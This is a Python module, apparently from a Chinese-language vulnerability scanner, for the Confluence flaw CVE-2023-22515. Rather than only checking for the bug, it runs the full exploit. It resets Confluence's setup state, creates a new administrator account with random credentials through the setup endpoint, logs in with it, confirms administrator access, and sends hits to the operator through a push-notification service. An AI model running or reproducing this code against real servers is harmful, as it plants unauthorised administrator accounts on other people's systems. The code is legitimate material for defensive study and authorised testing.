import random
import string

from Common.Common_Request import common_request
from Modules.Configure import ServerJ


class Basic_information:
    no = 104,
    bugName = "Confluence未授权管理用户添加 (CVE-2023-22515)"


def scan_Confluence_Unauthorized_Management_User_Addition(url, proxies, append_to_output, serverJ_key, bugName):
    def append_No():
        append_to_output(f"[-] {url} 不存在{bugName}", "green")

    path1 = "/setup/setupadministrator-start.action"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.667.76 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Content-Type": "application/json",
    }

    response1 = common_request(url, path1, headers, method='GET', timeout=20, proxies=proxies,
                               append_to_output=append_to_output)
    if response1 is not None:
        if response1.status_code == 200 and 'Setup is already complete' in response1.text:
            append_to_output(f"[+] 第一阶段已按照指定方式回显，准备进一步判断是否存在漏洞！！！！", "yellow")

            def generate_random_string(length):
                return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

            path2 = f"/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache{generate_random_string(27)}"
            response2 = common_request(url, path2, headers, method='GET', timeout=20, proxies=proxies,
                                       append_to_output=append_to_output)
            if response2 is not None:
                if response2.status_code == 200:
                    append_to_output(f"[+] 第二阶段已按照指定方式回显，准备进一步判断是否存在漏洞！！！！", "yellow")
                    path3 = "/setup/setupadministrator-start.action"
                    response3 = common_request(url, path3, headers, method='GET', timeout=20, proxies=proxies,
                                               append_to_output=append_to_output)
                    if response3 is not None:
                        if response3.status_code == 200 and 'Please configure the system administrator account for this Confluence installation' in response3.text:
                            append_to_output(f"[+] 第三阶段已按照指定方式回显，准备进一步判断是否存在漏洞！！！！", "yellow")
                            path4 = "/setup/setupadministrator.action"
                            headers1 = {
                                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.667.76 Safari/537.36",
                                "Connection": "close",
                                "Content-Type": "application/x-www-form-urlencoded",
                                "Cookie": "JSESSIONID=1A19A70081180EA39CD40D84AB9DDFF7",
                                "X-Atlassian-Token": "no-check",
                                "Accept-Encoding": "gzip, deflate"
                            }
                            # 生成随机用户名和密码
                            username = generate_random_string(10)
                            password = generate_random_string(10)

                            dataone = f'''username={username}&fullName=admin&email={username}@{password}.com&password={password}&confirm={password}&setup-next-button=Next'''
                            response4 = common_request(url, path4, headers1, method='POST', data=dataone, timeout=20,
                                                       proxies=proxies, append_to_output=append_to_output)
                            if response4 is not None:
                                if response4.status_code == 200:
                                    append_to_output(f"[+] 第四阶段已按照指定方式回显，准备进一步判断是否存在漏洞！！！！",
                                                     "yellow")
                                    path5 = "/dologin.action"
                                    data5 = f'''os_username={username}&os_password={password}&login=Log+in&os_destination=%2Findex.action'''
                                    response5 = common_request(url, path5, headers1, method='POST', data=data5,
                                                               timeout=20,
                                                               proxies=proxies, append_to_output=append_to_output)
                                    if response5 is not None:
                                        if response5.status_code == 200:
                                            append_to_output(
                                                f"[+] 第五阶段已按照指定方式回显，准备进一步判断是否存在漏洞！！！！",
                                                "yellow")

                                            path6 = "/welcome.action"
                                            response6 = common_request(url, path6, headers, method='GET', timeout=20,
                                                                       proxies=proxies,
                                                                       append_to_output=append_to_output)
                                            if response6 is not None:
                                                if response6.status_code == 200 and 'Administration' in response6.text:
                                                    append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
                                                    ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ",
                                                                    ServerJ_Key=serverJ_key)
                                                else:
                                                    append_No()
                                        else:
                                            append_No()
                                else:
                                    append_No()
                        else:
                            append_No()
                else:
                    append_No()
        else:
            append_No()
